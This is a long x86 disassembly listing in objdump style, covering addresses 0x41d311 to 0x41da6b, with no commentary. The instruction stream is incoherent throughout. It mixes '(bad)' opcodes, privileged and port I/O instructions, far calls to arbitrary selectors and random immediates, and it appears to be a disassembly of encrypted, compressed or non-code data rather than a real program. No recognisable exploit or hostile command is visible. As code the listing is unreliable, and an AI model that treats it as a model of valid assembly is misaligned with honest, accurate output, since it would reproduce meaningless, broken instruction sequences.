  41d311:	lods   eax,DWORD PTR ds:[esi]
  41d312:	inc    ebx
  41d313:	cli    
  41d314:	pop    es
  41d315:	int    0x5c
  41d317:	popa   
  41d318:	ins    BYTE PTR es:[edi],dx
  41d319:	xchg   BYTE PTR [ebx],bl
  41d31b:	xchg   ecx,eax
  41d31c:	ds icebp 
  41d31e:	std    
  41d31f:	mov    ebx,0x28ccbfea
  41d324:	cwde   
  41d325:	mov    ds:0x1a274e30,al
  41d32a:	sub    eax,0x819dafb3
  41d32f:	xchg   esi,eax
  41d330:	(bad)  
  41d331:	jns    0x41d2ec
  41d333:	ds aam 0x0
  41d336:	std    
  41d337:	adc    esp,DWORD PTR [ebx-0xf]
  41d33a:	dec    ecx
  41d33b:	jno    0x41d393
  41d33d:	ds scas al,BYTE PTR es:[edi]
  41d33f:	xchg   edx,edi
  41d341:	add    dh,BYTE PTR [eax-0x77]
  41d344:	dec    ebx
  41d345:	mov    edx,0x5ed901d2
  41d34a:	rcl    DWORD PTR [ecx],0x2d
  41d34d:	cmp    eax,0x141d9fd0
  41d352:	push   ebx
  41d353:	faddp  st(7),st
  41d355:	dec    esi
  41d356:	stos   BYTE PTR es:[edi],al
  41d357:	add    ah,al
  41d359:	in     al,0x1
  41d35b:	pop    DWORD PTR ss:[edx-0x3f]
  41d35f:	outs   dx,DWORD PTR ds:[esi]
  41d360:	push   edx
  41d361:	mov    BYTE PTR [edx+ebx*4+0x3419dca6],al
  41d368:	clc    
  41d369:	outs   dx,BYTE PTR ds:[esi]
  41d36a:	push   edi
  41d36b:	je     0x41d35c
  41d36d:	mov    bl,BYTE PTR [ebp+0x46]
  41d370:	or     al,0xa8
  41d372:	in     al,0x45
  41d374:	sub    eax,0x8c62c3dc
  41d379:	clc    
  41d37a:	xchg   ecx,esp
  41d37c:	nop
  41d37d:	adc    BYTE PTR [edx-0x1290f997],bl
  41d383:	sub    al,cl
  41d385:	test   BYTE PTR [esi],dl
  41d387:	xchg   ebp,eax
  41d388:	fcom   QWORD PTR [ebp+0x7a]
  41d38b:	mov    dh,ch
  41d38d:	hlt    
  41d38e:	arpl   WORD PTR [edi+edx*4+0x65],si
  41d392:	repnz add BYTE PTR [ecx],0x6a
  41d396:	mov    esi,0xc50d6d91
  41d39b:	xchg   esi,eax
  41d39c:	sbb    BYTE PTR [eax+0x32],ah
  41d39f:	mov    eax,ds:0x655f43f9
  41d3a4:	in     al,dx
  41d3a5:	or     eax,edi
  41d3a7:	pop    ds
  41d3a8:	shl    BYTE PTR [eax-0x919a586],1
  41d3ae:	loop   0x41d387
  41d3b0:	and    al,0xfb
  41d3b2:	scas   al,BYTE PTR es:[edi]
  41d3b3:	pop    ecx
  41d3b4:	fldenv [eax]
  41d3b6:	xor    DWORD PTR [edi+0x62],esi
  41d3b9:	ds push eax
  41d3bb:	in     eax,dx
  41d3bc:	inc    ebp
  41d3bd:	mov    esp,0x9cdf82a2
  41d3c2:	ror    BYTE PTR [ecx],1
  41d3c4:	ins    DWORD PTR es:[edi],dx
  41d3c5:	repnz dec edi
  41d3c7:	and    ch,al
  41d3c9:	push   0x3ee48ebb
  41d3ce:	jl     0x41d37a
  41d3d0:	in     eax,dx
  41d3d1:	test   eax,0xe0277046
  41d3d6:	jp     0x41d3aa
  41d3d8:	fdiv   DWORD PTR [edi]
  41d3da:	cmp    edx,ecx
  41d3dc:	ins    BYTE PTR es:[edi],dx
  41d3dd:	outs   dx,DWORD PTR ds:[esi]
  41d3de:	jmp    0x41d395
  41d3e0:	das    
  41d3e1:	push   ds
  41d3e2:	push   esi
  41d3e3:	ja     0x41d427
  41d3e5:	aam    0x10
  41d3e7:	jge    0x41d3cd
  41d3e9:	sbb    edx,DWORD PTR [edi+0x6fcce3c]
  41d3ef:	mov    eax,0x82929d9a
  41d3f4:	sub    bl,BYTE PTR [edi+0x4d]
  41d3f7:	sbb    bh,bl
  41d3f9:	pop    ds
  41d3fa:	aad    0x9f
  41d3fc:	push   eax
  41d3fd:	mov    eax,DWORD PTR [ecx+0x2]
  41d400:	fs in  eax,0x7e
  41d403:	call   0x5e01:0x77f76c85
  41d40a:	mov    edx,ebx
  41d40c:	cld    
  41d40d:	adc    eax,0x27448d3e
  41d412:	xchg   esp,eax
  41d413:	adc    esp,DWORD PTR [eax-0x68a363bd]
  41d419:	xor    edi,esi
  41d41b:	fstp   DWORD PTR [edi-0x74]
  41d41e:	pop    es
  41d41f:	fisub  DWORD PTR [esi-0x52adff25]
  41d425:	cmp    BYTE PTR [edx],al
  41d427:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d428:	and    al,0xa9
  41d42a:	push   esi
  41d42b:	lea    esi,ds:0xf5ff19c6
  41d431:	outs   dx,DWORD PTR ds:[esi]
  41d432:	ret    0xd18b
  41d435:	lods   al,BYTE PTR ds:[esi]
  41d436:	neg    DWORD PTR [ecx+edi*2-0x588dc276]
  41d43d:	shr    ch,cl
  41d43f:	mov    esi,0xda646c2c
  41d444:	jg     0x41d403
  41d446:	ds inc ecx
  41d448:	and    BYTE PTR [ebx],al
  41d44a:	add    dl,BYTE PTR [edx+eax*8+0x59]
  41d44e:	adc    ebx,DWORD PTR [edi-0x4474b38f]
  41d454:	stos   DWORD PTR es:[edi],eax
  41d455:	xlat   BYTE PTR ds:[ebx]
  41d456:	xchg   esp,eax
  41d457:	push   0x60bd264
  41d45c:	ds inc edx
  41d45e:	ins    DWORD PTR es:[edi],dx
  41d45f:	push   ebx
  41d460:	hlt    
  41d461:	rcl    DWORD PTR [ebx],cl
  41d463:	mov    BYTE PTR [edi],al
  41d465:	sub    esp,DWORD PTR [eax+0x3f]
  41d468:	mov    edi,0xcd542dc5
  41d46d:	jle    0x41d4b5
  41d46f:	xlat   BYTE PTR ds:[ebx]
  41d470:	out    dx,al
  41d471:	gs jl  0x41d467
  41d474:	lock inc ebp
  41d476:	mov    edi,0x4060ddfb
  41d47b:	cs push esi
  41d47d:	imul   edx,DWORD PTR [ecx],0x625b7fcf
  41d483:	sahf   
  41d484:	ret    
  41d485:	stos   DWORD PTR es:[edi],eax
  41d486:	sub    BYTE PTR [edx+0x72672a87],0x7f
  41d48d:	je     0x41d48e
  41d48f:	add    ecx,DWORD PTR [ecx]
  41d491:	out    0xd9,eax
  41d493:	pop    es
  41d494:	lock cmp dl,BYTE PTR [esi-0x3cb19108]
  41d49b:	mov    ebp,0x61c2e692
  41d4a0:	fmul   QWORD PTR [ebp+0x7f]
  41d4a3:	mov    ah,0xc2
  41d4a5:	mov    dh,0x21
  41d4a7:	sahf   
  41d4a8:	jb     0x41d4c5
  41d4aa:	stc    
  41d4ab:	mul    bh
  41d4ad:	or     eax,0x4c7b9876
  41d4b2:	mov    ?,ebp
  41d4b4:	pop    ebx
  41d4b5:	or     eax,DWORD PTR [ebx+0x28572aec]
  41d4bb:	jae    0x41d49b
  41d4bd:	xor    WORD PTR ds:0xe472118e,bx
  41d4c4:	(bad)  
  41d4c5:	(bad)  
  41d4c7:	jge    0x41d4d9
  41d4c9:	(bad)  
  41d4ca:	sub    ebp,DWORD PTR [esi-0x5e]
  41d4cd:	rcl    DWORD PTR [edi-0x41],cl
  41d4d0:	cld    
  41d4d1:	inc    esp
  41d4d2:	shl    DWORD PTR [ecx-0x9],1
  41d4d5:	icebp  
  41d4d6:	sub    ebp,DWORD PTR [eax-0x71dfdfba]
  41d4dc:	mov    al,0x61
  41d4de:	cmp    al,BYTE PTR [edi-0x14]
  41d4e1:	mov    al,0xcb
  41d4e3:	psrad  mm2,QWORD PTR [ebx+0x5e3a144e]
  41d4ea:	call   0xbeb5:0x2c1aeb10
  41d4f1:	xchg   DWORD PTR [eax+edi*8+0x519cbfb3],eax
  41d4f8:	sub    BYTE PTR es:[ecx],dh
  41d4fb:	ror    DWORD PTR ds:0x8791ce29,1
  41d501:	adc    cl,BYTE PTR [ebx+0x4f697b30]
  41d507:	pop    ecx
  41d508:	inc    esp
  41d509:	sbb    BYTE PTR [ebp-0x24],al
  41d50c:	inc    ebx
  41d50d:	cmc    
  41d50e:	call   0xff85:0xac5ec4d3
  41d515:	or     edx,DWORD PTR [ecx]
  41d517:	mov    edi,0x4d2963a
  41d51c:	mov    edx,0x570260bb
  41d521:	xor    eax,0x8c66a7e1
  41d526:	popa   
  41d527:	jle    0x41d506
  41d529:	push   ds
  41d52a:	bound  ebp,QWORD PTR [edi+0x3e]
  41d52d:	js     0x41d501
  41d52f:	mov    eax,ds:0x24353f76
  41d534:	faddp  st(1),st
  41d536:	jmp    0xe66031f4
  41d53b:	xor    BYTE PTR [edi],al
  41d53d:	pop    esi
  41d53e:	cmp    esi,DWORD PTR [edi+ebx*8+0x5f260150]
  41d545:	jl     0x41d51f
  41d547:	mov    ds:0x9f313599,al
  41d54c:	fsubrp st(3),st
  41d54e:	cmp    dl,BYTE PTR [ebp-0x55]
  41d551:	imul   ebp,esp,0xf436f1b9
  41d557:	push   eax
  41d558:	cdq    
  41d559:	lea    ebp,[edi-0x37]
  41d55c:	jg     0x41d5d7
  41d55e:	lahf   
  41d55f:	cld    
  41d560:	inc    eax
  41d561:	sahf   
  41d562:	in     eax,0x2f
  41d564:	fucom  st(1)
  41d566:	cmp    BYTE PTR [eax],dl
  41d568:	adc    al,0x46
  41d56a:	sahf   
  41d56b:	xchg   ebp,eax
  41d56c:	mov    ebx,0x33e44bf1
  41d571:	jp     0x41d50f
  41d573:	or     bh,BYTE PTR [eax-0x13]
  41d576:	mov    ch,dh
  41d578:	test   al,0xbb
  41d57a:	pop    edx
  41d57b:	push   es
  41d57c:	sbb    ebx,DWORD PTR [edi]
  41d57e:	push   ds
  41d57f:	(bad)
  41d582:	xchg   ebx,eax
  41d583:	and    ah,BYTE PTR [edx]
  41d585:	xchg   DWORD PTR [ebp+0x75428b7b],ecx
  41d58b:	xchg   BYTE PTR [edx],ah
  41d58d:	in     al,dx
  41d58e:	jge    0x41d5e1
  41d590:	adc    DWORD PTR [edi+ebp*2],ebp
  41d593:	sar    esi,cl
  41d595:	or     eax,DWORD PTR [ecx]
  41d597:	outs   dx,DWORD PTR ds:[esi]
  41d598:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d599:	jnp    0x41d57f
  41d59b:	int3   
  41d59c:	mov    ecx,ebp
  41d59e:	xchg   ebx,eax
  41d59f:	pushf  
  41d5a0:	(bad)  
  41d5a1:	push   esp
  41d5a2:	gs rcr eax,cl
  41d5a5:	or     al,0x14
  41d5a7:	push   ebp
  41d5a8:	push   esp
  41d5a9:	push   eax
  41d5aa:	cmc    
  41d5ab:	mov    ecx,0xf81403d1
  41d5b0:	div    DWORD PTR [edi-0x3badb421]
  41d5b6:	or     ecx,DWORD PTR [edi+0x4b421910]
  41d5bc:	enter  0xdeca,0xb9
  41d5c0:	or     DWORD PTR [edi+esi*2+0x4838643c],esp
  41d5c7:	push   esp
  41d5c8:	cmp    DWORD PTR ss:[edi-0x30],esi
  41d5cc:	sti    
  41d5cd:	push   ebx
  41d5ce:	jmp    0x9b79:0x2194b89d
  41d5d5:	daa    
  41d5d6:	aaa    
  41d5d7:	jbe    0x41d5e8
  41d5d9:	xor    al,0x85
  41d5db:	stos   BYTE PTR es:[edi],al
  41d5dc:	sbb    BYTE PTR [edx+0x6c],cl
  41d5df:	outs   dx,WORD PTR ds:[esi]
  41d5e1:	adc    cl,cl
  41d5e3:	sbb    BYTE PTR [eax+0x2b],cl
  41d5e6:	xchg   esi,eax
  41d5e7:	push   ebp
  41d5e8:	push   es
  41d5e9:	jnp    0x41d659
  41d5eb:	xor    al,0x7c
  41d5ed:	xchg   esi,eax
  41d5ee:	test   eax,0x20c5df8b
  41d5f3:	inc    esi
  41d5f4:	push   esp
  41d5f5:	dec    ebx
  41d5f6:	ror    ch,1
  41d5f8:	sti    
  41d5f9:	sub    eax,0xefe5c39e
  41d5fe:	pop    ecx
  41d5ff:	push   ebp
  41d600:	mov    WORD PTR [ecx],gs
  41d602:	cwde   
  41d603:	xchg   ebp,eax
  41d604:	adc    eax,eax
  41d606:	cmp    eax,0x2c380b17
  41d60b:	pop    edi
  41d60c:	pop    edi
  41d60d:	and    ecx,DWORD PTR [ecx-0x28]
  41d610:	xor    ebp,edx
  41d612:	mov    esp,0x31492264
  41d617:	mov    edx,0x2cb5d3c8
  41d61c:	sbb    al,BYTE PTR [ecx+ebx*2]
  41d61f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d620:	aam    0x13
  41d622:	ja     0x41d603
  41d624:	outs   dx,DWORD PTR ds:[esi]
  41d625:	fs rol ecx,1
  41d628:	hlt    
  41d629:	ja     0x41d65e
  41d62b:	repz cli 
  41d62d:	jg     0x41d5c9
  41d62f:	js     0x41d60f
  41d631:	outs   dx,DWORD PTR ds:[esi]
  41d632:	adc    esi,eax
  41d634:	sbb    al,0x2
  41d636:	stc    
  41d637:	enter  0x4cee,0xf2
  41d63b:	mov    bh,0x16
  41d63d:	in     eax,0x96
  41d63f:	mov    DWORD PTR [ecx-0x4c],ebx
  41d642:	adc    al,0xd4
  41d644:	xchg   BYTE PTR [ecx],bl
  41d646:	jle    0x41d634
  41d648:	sahf   
  41d649:	or     BYTE PTR [ebx-0x3e],ch
  41d64c:	inc    esi
  41d64d:	(bad)  
  41d64e:	es or  al,0x35
  41d651:	mov    edi,0x14281e3a
  41d656:	pop    ebp
  41d657:	add    al,0x24
  41d659:	add    BYTE PTR [ecx+0x12],ch
  41d65c:	(bad)  
  41d65d:	sahf   
  41d65e:	js     0x41d6c4
  41d660:	jbe    0x41d6ca
  41d662:	xor    dl,dl
  41d664:	fldenv ds:0x7712a833
  41d66a:	cmp    dh,ah
  41d66c:	pop    DWORD PTR [ebx-0x75]
  41d66f:	xchg   ebp,eax
  41d670:	mov    edi,0x93ee39e6
  41d675:	mov    ds:0xe893b43b,al
  41d67a:	xor    BYTE PTR [eax+0x52],dh
  41d67d:	push   ebp
  41d67e:	mov    BYTE PTR [ecx+0x75],dh
  41d681:	out    0x6f,eax
  41d683:	idiv   DWORD PTR [eax-0x18]
  41d686:	imul   eax,DWORD PTR [edx+ebx*1-0x38c3fc8a],0xcecdd57e
  41d691:	lea    ebx,[edi-0x61e4ac57]
  41d697:	adc    al,0x12
  41d699:	stos   BYTE PTR es:[edi],al
  41d69a:	add    bh,BYTE PTR [esi+0x1e9f3183]
  41d6a0:	jle    0x41d715
  41d6a2:	sub    ebx,DWORD PTR [ebp+0x50]
  41d6a5:	out    dx,eax
  41d6a6:	add    BYTE PTR [eax+0x3b61edd0],dh
  41d6ac:	and    al,0x13
  41d6ae:	xor    edi,esp
  41d6b0:	xchg   edx,eax
  41d6b1:	add    al,0x37
  41d6b3:	mov    al,0xdb
  41d6b5:	lods   al,BYTE PTR ds:[esi]
  41d6b6:	(bad)  
  41d6b7:	pop    eax
  41d6b8:	or     bl,BYTE PTR [eax+ebp*8-0x11]
  41d6bc:	test   al,0x68
  41d6be:	ins    BYTE PTR es:[edi],dx
  41d6bf:	ja     0x41d73a
  41d6c1:	pop    edi
  41d6c2:	ffreep st(4)
  41d6c4:	in     eax,dx
  41d6c5:	test   BYTE PTR [esi-0x3a],dh
  41d6c8:	xor    ecx,DWORD PTR [edi-0x7827d1]
  41d6ce:	inc    edi
  41d6cf:	inc    eax
  41d6d0:	nop
  41d6d1:	retf   
  41d6d2:	jbe    0x41d67c
  41d6d4:	sar    DWORD PTR ss:[ecx],cl
  41d6d7:	dec    edi
  41d6d8:	(bad)  
  41d6da:	mov    dh,0x4d
  41d6dc:	jmp    FWORD PTR [edx]
  41d6de:	popf   
  41d6df:	fwait
  41d6e0:	daa    
  41d6e1:	daa    
  41d6e2:	cmp    DWORD PTR [eax+ebx*1-0x2b],0x5e
  41d6e7:	xor    eax,0xbc0d740e
  41d6ec:	xor    al,0x64
  41d6ee:	dec    ebx
  41d6ef:	sbb    eax,0x7859a1d4
  41d6f4:	mov    ch,0xf5
  41d6f6:	pop    es
  41d6f7:	in     al,0x66
  41d6f9:	jmp    0x284ad2bb
  41d6fe:	(bad)  
  41d700:	push   edx
  41d701:	ret    0x1b21
  41d704:	mov    ebp,esi
  41d706:	fcomp  DWORD PTR [esi-0x5b565bbb]
  41d70c:	daa    
  41d70d:	push   ebp
  41d70e:	mov    ch,BYTE PTR [ebp+0x35]
  41d711:	inc    ebx
  41d712:	add    ch,bh
  41d714:	xchg   ebp,eax
  41d715:	and    edi,DWORD PTR [eax+0x336430ef]
  41d71b:	jns    0x41d6ee
  41d71d:	jp     0x41d705
  41d71f:	and    al,0x55
  41d721:	push   ebp
  41d722:	xchg   ebp,eax
  41d723:	mov    dl,0xf8
  41d725:	jns    0x41d75f
  41d727:	mov    WORD PTR [ecx],fs
  41d729:	(bad)  
  41d72a:	mov    ds:0x5662dbb0,al
  41d72f:	jecxz  0x41d6ea
  41d731:	push   ecx
  41d732:	push   ecx
  41d733:	pop    edx
  41d734:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d735:	div    DWORD PTR [esi+edx*4]
  41d738:	jg     0x41d70f
  41d73a:	call   DWORD PTR [eax+0x66]
  41d73d:	sbb    al,0x48
  41d73f:	test   DWORD PTR [esi],edi
  41d741:	xor    eax,0xa24655ea
  41d746:	xchg   ebp,eax
  41d747:	fisubr WORD PTR [eax]
  41d749:	sub    eax,0x2fc4fbf7
  41d74e:	push   ebp
  41d74f:	test   eax,0xf89c01d1
  41d754:	mov    dh,0x29
  41d756:	jns    0x41d7cb
  41d758:	cdq    
  41d759:	jge    0x41d7cb
  41d75b:	xchg   edi,eax
  41d75c:	adc    ecx,DWORD PTR [ebx+edx*4]
  41d75f:	call   FWORD PTR [esp+ecx*4]
  41d762:	loope  0x41d7b5
  41d764:	imul   ecx,DWORD PTR [edx],0x3a
  41d767:	clc    
  41d768:	scas   eax,DWORD PTR es:[edi]
  41d769:	jnp    0x41d792
  41d76b:	cmp    esp,DWORD PTR [ebp+eiz*8-0x3230c99a]
  41d772:	jmp    0x41d70a
  41d774:	cmp    al,0x8b
  41d776:	fidiv  WORD PTR [edx+0xd]
  41d779:	(bad)
  41d77c:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41d77e:	aaa    
  41d77f:	shl    BYTE PTR [edx+0x4054ddd3],0x9
  41d786:	push   esp
  41d787:	or     bh,dl
  41d789:	arpl   WORD PTR [esi+0x755f83fe],bx
  41d78f:	into   
  41d790:	push   0x12
  41d792:	adc    BYTE PTR [edx+0x16],0x2e
  41d796:	pop    ds
  41d797:	int    0x72
  41d799:	aam    0xec
  41d79b:	aad    0xb4
  41d79d:	push   0xffffff98
  41d79f:	xor    BYTE PTR ds:0x281c90c8,ah
  41d7a5:	pusha  
  41d7a6:	and    ch,BYTE PTR [ecx+0x972f905]
  41d7ac:	sar    BYTE PTR [edi-0x53085027],cl
  41d7b2:	pop    DWORD PTR ss:[ecx-0x522a2d68]
  41d7b9:	pop    edi
  41d7ba:	fistp  QWORD PTR [esp+eax*8-0x51]
  41d7be:	pusha  
  41d7bf:	jno    0x41d796
  41d7c1:	adc    al,0xce
  41d7c3:	std    
  41d7c4:	add    BYTE PTR [eax+0x52],ch
  41d7c7:	xlat   BYTE PTR ds:[ebx]
  41d7c8:	jp     0x41d75d
  41d7ca:	mov    es,WORD PTR [edx-0xe1b1156]
  41d7d0:	in     eax,dx
  41d7d1:	cs xchg esp,eax
  41d7d3:	mov    al,0xe2
  41d7d5:	xor    al,0x62
  41d7d7:	int3   
  41d7d8:	(bad)  
  41d7d9:	xchg   esi,eax
  41d7da:	jle    0x41d7e1
  41d7dc:	lds    ecx,FWORD PTR ds:0x795d6840
  41d7e2:	in     al,0xc6
  41d7e4:	mov    dh,0x14
  41d7e6:	xor    DWORD PTR [ecx+esi*2],esp
  41d7e9:	sbb    bl,0xb7
  41d7ec:	out    0x99,al
  41d7ee:	sub    al,0x70
  41d7f0:	sub    bl,BYTE PTR [edi+0x2d152699]
  41d7f6:	jno    0x41d797
  41d7f8:	add    ebp,ecx
  41d7fa:	sbb    DWORD PTR [ecx-0x29],esi
  41d7fd:	rsm    
  41d7ff:	and    dl,BYTE PTR [edx+0x0]
  41d802:	fnsave [eax-0x19d83ed1]
  41d808:	daa    
  41d809:	add    cl,cl
  41d80b:	push   0xce6be23d
  41d810:	sti    
  41d811:	jmp    0x52b4:0x7e48565a
  41d818:	jle    0x41d84d
  41d81a:	leave  
  41d81b:	mov    al,0xf5
  41d81d:	add    eax,0xc1e1dc1
  41d822:	loop   0x41d7da
  41d824:	inc    ebp
  41d825:	cld    
  41d826:	add    al,0x41
  41d828:	mov    edi,0xf2d17337
  41d82d:	call   0x2e72:0x6a41c8d8
  41d834:	add    eax,0x71b0096d
  41d839:	leave  
  41d83a:	dec    edi
  41d83b:	cmp    BYTE PTR [ecx],ah
  41d83d:	xor    al,0x2
  41d83f:	push   esi
  41d840:	into   
  41d841:	cmp    BYTE PTR [edi-0xa38ec9a],bh
  41d847:	add    ch,dh
  41d849:	iret   
  41d84a:	or     al,0x4
  41d84c:	mov    esp,0x15c1e9fe
  41d851:	and    DWORD PTR [ecx+0x8],esi
  41d854:	out    dx,eax
  41d855:	jmp    0x41d7f7
  41d857:	mov    ecx,0x4e0beb12
  41d85c:	ror    DWORD PTR [esi+0x6e6fd115],0x78
  41d863:	bnd repz call 0xfe7e6857
  41d86a:	aas    
  41d86b:	(bad)  
  41d86d:	mov    WORD PTR [edx-0x3c],cs
  41d870:	iret   
  41d871:	lods   al,BYTE PTR ds:[esi]
  41d872:	xchg   edi,eax
  41d873:	lea    esp,[edx]
  41d875:	call   0x894052ef
  41d87a:	cmc    
  41d87b:	(bad)  
  41d87c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d87d:	pop    esi
  41d87e:	out    0xa9,al
  41d880:	inc    ebx
  41d881:	scas   al,BYTE PTR es:[edi]
  41d882:	mov    ch,0x97
  41d884:	pop    es
  41d885:	adc    BYTE PTR [ecx+edi*2],bh
  41d888:	mov    edi,0xd5f81093
  41d88d:	sahf   
  41d88e:	adc    BYTE PTR [edx],cl
  41d890:	mov    BYTE PTR [ebp-0x2a2e7272],dh
  41d896:	out    dx,al
  41d897:	out    0x1,al
  41d899:	fnstsw WORD PTR [edi]
  41d89b:	call   0x56b1:0x1f10f46c
  41d8a2:	inc    eax
  41d8a3:	in     al,dx
  41d8a4:	sbb    dh,bh
  41d8a6:	mov    bh,0xfa
  41d8a8:	xchg   edi,eax
  41d8a9:	push   ecx
  41d8aa:	fsubr  QWORD PTR ds:0x2fd7b4f1
  41d8b0:	in     eax,dx
  41d8b1:	int    0x29
  41d8b3:	xchg   ebx,eax
  41d8b4:	push   ebx
  41d8b5:	imul   DWORD PTR [ebp-0x3e]
  41d8b8:	rcl    ecx,1
  41d8ba:	jbe    0x41d8d7
  41d8bc:	cmc    
  41d8bd:	jae    0x41d913
  41d8bf:	lods   al,BYTE PTR cs:[esi]
  41d8c1:	test   al,0xd2
  41d8c3:	and    eax,0x70b273a9
  41d8c8:	pusha  
  41d8c9:	mov    dh,0xf3
  41d8cb:	loop   0x41d943
  41d8cd:	stos   BYTE PTR es:[edi],al
  41d8ce:	mov    ah,0xdf
  41d8d0:	aam    0x9d
  41d8d2:	mov    ch,0xc2
  41d8d4:	mov    cl,0x60
  41d8d6:	mov    esp,0x1563a22a
  41d8db:	ja     0x41d8d6
  41d8dd:	mov    ebx,0x45d896e6
  41d8e2:	sbb    DWORD PTR [edx+eiz*2-0x1d],esi
  41d8e6:	jmp    0xdf01a736
  41d8eb:	into   
  41d8ec:	push   0x35405306
  41d8f1:	arpl   si,ax
  41d8f3:	sub    BYTE PTR [esi-0x1f904a8d],ah
  41d8f9:	rcr    BYTE PTR [eax+0x5e],0x55
  41d8fd:	loope  0x41d95e
  41d8ff:	test   BYTE PTR [eax],al
  41d901:	sahf   
  41d902:	inc    edi
  41d903:	adc    DWORD PTR ds:0xefc95158,0x38aa1580
  41d90d:	mov    ecx,0xc1643f3f
  41d912:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d913:	pop    ebp
  41d914:	mov    ah,0xec
  41d916:	frstor [ecx+ebx*4]
  41d919:	mov    edx,0x88f7b327
  41d91e:	xchg   esi,eax
  41d91f:	call   DWORD PTR [edi-0x5bdbc16b]
  41d925:	fimul  WORD PTR [esi-0x48e643ff]
  41d92b:	jge    0x41d8bb
  41d92d:	sbb    ecx,DWORD PTR [edi-0x77]
  41d930:	lds    ebp,FWORD PTR [edx-0x23eae354]
  41d936:	sbb    eax,0x88b9f4fc
  41d93b:	sbb    DWORD PTR [esi-0x39],ebp
  41d93e:	jns    0x41d96c
  41d940:	push   esi
  41d941:	das    
  41d942:	cmp    eax,0xf518e8be
  41d947:	addr16 pop edi
  41d949:	mov    esi,DWORD PTR [esi+0x6373dbaf]
  41d94f:	sar    DWORD PTR [ebx-0x17],0x1e
  41d953:	pop    esp
  41d954:	rcr    BYTE PTR [edi-0x42],1
  41d957:	aam    0x85
  41d959:	les    ecx,FWORD PTR [ecx-0x10]
  41d95c:	mov    edx,DWORD PTR [edi]
  41d95e:	out    dx,al
  41d95f:	icebp  
  41d960:	and    al,0x61
  41d962:	xchg   ebx,eax
  41d963:	dec    bh
  41d965:	mov    ebx,0xdde1d540
  41d96a:	aaa    
  41d96b:	into   
  41d96c:	shl    BYTE PTR [edx],cl
  41d96e:	inc    ecx
  41d96f:	add    eax,0x4f1efccd
  41d974:	int3   
  41d975:	test   DWORD PTR [esi-0x40],0x46269276
  41d97c:	lea    ecx,[ebx-0x7697beb0]
  41d982:	js     0x41d959
  41d984:	push   esi
  41d985:	adc    bl,cl
  41d987:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d988:	dec    eax
  41d989:	fnsave [edi+0x2b]
  41d98c:	xchg   edi,eax
  41d98d:	dec    ebx
  41d98e:	jmp    0x41d9de
  41d990:	jns    0x41d9b4
  41d992:	or     DWORD PTR [esi-0x2e],ebx
  41d995:	jnp    0x41d9d9
  41d997:	cmp    DWORD PTR [esi+0x32824689],edx
  41d99d:	fsubr  DWORD PTR [eax-0x27]
  41d9a0:	pop    eax
  41d9a1:	ja     0x41d94b
  41d9a3:	int3   
  41d9a4:	pop    ebp
  41d9a5:	ds push ecx
  41d9a7:	xlat   BYTE PTR ds:[ebx]
  41d9a8:	jp     0x41da06
  41d9aa:	mov    al,ds:0xaa6c6252
  41d9b0:	sbb    BYTE PTR [edi],0x7e
  41d9b3:	sbb    ch,al
  41d9b5:	mov    edi,0x4c09142e
  41d9ba:	pop    ecx
  41d9bb:	cmp    al,0xec
  41d9bd:	(bad)  
  41d9be:	sar    DWORD PTR ds:0xc87c9e6f,1
  41d9c4:	mov    edx,0x1f22edd7
  41d9c9:	fcomp  DWORD PTR [eax-0x4]
  41d9cc:	test   BYTE PTR [edi-0x55],ah
  41d9cf:	add    al,0x56
  41d9d1:	mov    ebx,0x8ddfd97a
  41d9d6:	pop    eax
  41d9d7:	stos   DWORD PTR es:[edi],eax
  41d9d8:	push   esp
  41d9d9:	or     al,0x5
  41d9db:	ins    BYTE PTR es:[edi],dx
  41d9dc:	jne    0x41da46
  41d9de:	adc    al,0xa0
  41d9e0:	(bad)  
  41d9e1:	pop    esp
  41d9e2:	and    al,0x13
  41d9e4:	jmp    0x494a56b
  41d9e9:	aas    
  41d9ea:	loope  0x41d9c6
  41d9ec:	loopne 0x41da54
  41d9ee:	(bad)  [edx-0x15a023a1]
  41d9f4:	out    dx,al
  41d9f5:	add    BYTE PTR [esi+0x2e],ah
  41d9f8:	fisttp QWORD PTR [ecx-0xa]
  41d9fb:	or     ah,BYTE PTR [edx-0x29158f27]
  41da01:	(bad)  
  41da02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da03:	ins    BYTE PTR es:[edi],dx
  41da04:	outs   dx,BYTE PTR ds:[esi]
  41da05:	out    dx,al
  41da06:	lods   al,BYTE PTR ds:[esi]
  41da07:	or     ecx,DWORD PTR [ebx]
  41da09:	lods   eax,DWORD PTR ds:[esi]
  41da0a:	push   ss
  41da0b:	fisttp WORD PTR [ecx]
  41da0d:	mov    DWORD PTR [esi],ecx
  41da0f:	sbb    al,0x69
  41da11:	outs   dx,DWORD PTR ds:[esi]
  41da12:	pop    eax
  41da13:	imul   edx,DWORD PTR [esi-0x602b0d58],0xffffffd8
  41da1a:	lahf   
  41da1b:	scas   eax,DWORD PTR es:[edi]
  41da1c:	and    eax,0xc0ffaa36
  41da21:	add    bh,BYTE PTR [esi]
  41da23:	jp     0x41da64
  41da25:	inc    edx
  41da26:	stos   BYTE PTR es:[edi],al
  41da27:	dec    ebx
  41da28:	xor    DWORD PTR [eax],eax
  41da2a:	je     0x41da2e
  41da2c:	aam    0x90
  41da2e:	fist   DWORD PTR [ebp-0x50]
  41da31:	cmp    BYTE PTR [edx+0x1d1a1f61],bl
  41da37:	sbb    al,0x67
  41da39:	daa    
  41da3a:	aas    
  41da3b:	inc    esi
  41da3c:	push   0x602a0e2f
  41da41:	mov    ah,0x4c
  41da43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da44:	mov    eax,0xb3f0ede4
  41da49:	je     0x41dac8
  41da4b:	sti    
  41da4c:	mov    cl,0x5b
  41da4e:	xchg   edx,eax
  41da4f:	test   BYTE PTR [eax-0x549b4848],dl
  41da55:	sbb    al,0x6e
  41da57:	rol    bh,0xdb
  41da5a:	test   DWORD PTR [ebp-0x44199a75],edi
  41da60:	jae    0x41d9e2
  41da62:	iret   
  41da63:	mov    al,ds:0x604cadfa
  41da68:	shr    BYTE PTR [ebx-0x43],1
  41da6b:	jns    0x41da15
